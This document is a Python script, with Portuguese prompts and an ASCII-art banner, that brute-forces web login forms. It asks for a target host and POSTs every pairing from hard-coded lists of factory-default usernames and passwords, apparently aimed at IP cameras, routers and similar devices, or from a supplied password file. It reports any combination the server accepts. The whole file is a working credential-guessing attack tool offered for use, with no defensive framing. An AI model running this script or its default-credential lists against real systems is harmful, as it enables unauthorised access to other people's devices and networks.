import requests

def ascii():
   print("""                                                    
                                                    ..oooddddddoooo..           
                                                oo$$$$$$$$$$$$$$$$$$$$$oo.      
                                             d$$$$$$**°°         °°**$$$$$$o    
                                              ?**°                     °°**     
                                                      ..oooodoooo..             
                                                  .d$$$$$$$$$$$$$$$$$oo         
                                                  $$$$**°°     °°**$$$$P        
                                                   °                 °          
                                                           .o                   
                                                       .o$$$$$.                 
                                                    od$$$$$$$$$                 
                                                 od$$$$$$$$$$*°ob               
                                             .o$$$$$$$$$$*°.od$$$b              
                                          od$$$$$$$$$$*°.d$$$$$$$$b             
                                      .o$$$$$$$$$$$*.od$$$$$$$$$$$$b            
                                   od$$$$$$$$$$*°.d$$$$$$$$$$$$$$$$$b           
                               .o$$$$$$$$$$**.od$$$$$$$$$$$$$$$$$$$$$           
                            od$$$$$$$$$$*°.d$$$$$$$$$$$$$$$$$$$$$$$$P           
                         od$$$$$$$$$$*°od$$$$$$$$$$$$$$$$$$$$$$$$$$$            
                     .o$$$$$$$$$$*°.od$$$$$$$$$$$$$$$$$$$$$$$$$$$$°             
                  od$$$$$$$$$$*°.d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*°               
              .o$$$$$$$$$$*°.o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*°                   
           od$$$$$$$$$$*°.d$$$$$$$$$$$$$$$$$$$$$$$$$$$$**                       
       .o$$$$$$$$$$**.od$$$$$$$$$$$$$$$$$$$$$$$$$$$$*°                          
    .d$$$$$$$$$$*°.o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                            
 od$$$$*******° d$$$$$$$$$$$$$$$$$$$$$$$$$$$$*$$$$$$                            
             .o. *$$$$$$$$$$$$$$$$$$$$$$$$*°   °**$$$                           
          o$$$$$$b °*$$$$$$$$$$$$$$$$$*°           $$$b                     $$$$
           *$$$$$$$o. °?$$$$$$$$$$$*°               ?$$$                    $$$$
             °*$$$$$$$o °*$$$$$*°                    ?$$$..             d$$$$$$$
                *$$$$**    **°                        ?$$$$$b...........d$$$$$$$
                  °°                                  d$$$$$$$$$$$$$$$$$$$$$$$$$
                                                       $$$$$*°°°°°°°°°°°?$$$$$$$
                                                                         ***$$$$
                                                                            $$$$
                                                                            $$$$""")

usernames = ['admin', 'root', 'Admin', 'administrador', 'service', 'Dinion', '666666', '888888', 'user1', 'administrator', 'config', 'admin1', 'adm', 'ubnt', 'ADMIN', 'supervisor']
passwords = ['12345', 'root', 'admin', '123456', '9999', '1234', 'pass', 'ce', '666666', '888888', 'camera', '11111111', 'fliradmin', '9999', 'HuaWei123', 'ChangeMe123', 'config', 'instar', '123456789system', 'jvc', '1111', 'ms1234', 'password', '4321', 'password', 'ikwd', 'ubnt', 'supervisor']

use_default = input("Deseja usar as variáveis padrão user/pass? (S/N): ")

if use_default.upper() == 'N':
    username_var = input("Digite o nome da variável de usuário: ")
    password_var = input("Digite o nome da variável de senha: ")
else:
    username_var = 'user'
    password_var = 'pass'

ascii()
host = input("Digite o host alvo: ")

use_default_passwords = input("Deseja usar as senhas padrões do script? (S/N): ")

if use_default_passwords.upper() == 'N':
    password_file = input("Digite o caminho para o arquivo de senhas: ")
    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

error_message = input("Digite a mensagem de erro esperada: ")
found_message = False

for username in usernames:
    for password in passwords:
        # Faz a solicitação ao host com os campos de usuário e senha
        response = requests.post(host, data={username_var: username, password_var: password})
        
        # Verifica a resposta da solicitação
        if response.status_code == 200:
            if response.text.lower().startswith('erro'):
                print("Combinação inválida - Usuário:", username, "Senha:", password)
            else:
                print("Combinação encontrada - Usuário:", username, "Senha:", password)
                print("Resposta do servidor:", response.text)
                found_message = True
                break
        elif response.text == error_message:
            print("Combinação inválida - Usuário:", username, "Senha:", password)
        else:
            print("Erro ao fazer a solicitação - Usuário:", username, "Senha:", password)
    
    if found_message:
        break
